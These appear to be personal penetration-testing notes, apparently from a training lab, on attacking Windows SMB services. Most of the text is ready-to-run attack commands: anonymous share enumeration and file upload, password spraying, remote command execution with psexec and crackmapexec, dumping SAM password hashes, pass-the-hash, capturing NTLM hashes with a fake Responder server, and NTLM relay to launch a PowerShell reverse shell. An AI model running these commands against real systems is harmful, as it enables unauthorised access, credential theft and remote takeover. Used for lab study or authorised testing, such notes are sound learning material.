### Misconfigurations

No Auth = null session 
	Anonymous login
#SMBClient
```shell
smbclient -N -L //10.129.14.128
```
#SMBMap
```shell
smbmap -H 10.129.14.128
```
```shell
smbmap -H 10.129.14.128 -r notes
```
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### #RPC 
Take advantage of null sessions 
Enumerate DC?
[cheat sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
```shell-session
rpcclient -U'%' 10.10.110.17
```

```shell
/enum4linux-ng.py 10.10.11.45 -A -C
```

### Password spray / #bruteforce 

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

### #RCE
```shell
impacket-psexec -h (<impacket-psexec administrator:'Password123!'@10.10.110.17>)
```

```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Logged on Users

```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extracting SAM Hashes 

```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### #PtH

```shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Forced Authentication Attacks 
Fake SMB Server to capture NTLM v1/2 hashes

```shell
responder -I <interface name>
```
crack creds on hashcat/john

Saved hashes will go to 
`/usr/share/responder/logs/`)

### Relay hash to [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)/ [multirelay](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)
Set #SMB to of in responder 
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='
```

Execute ntlmrelayx
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
Will dump SAM database,
execute commands with -c 

### Reverse shell
```shell
mpacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c <powershell base 64>
```
Need client to connect to SMB share 

## Recent Vulns
[SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
windows 10 1903 and 1909
Allows RE 
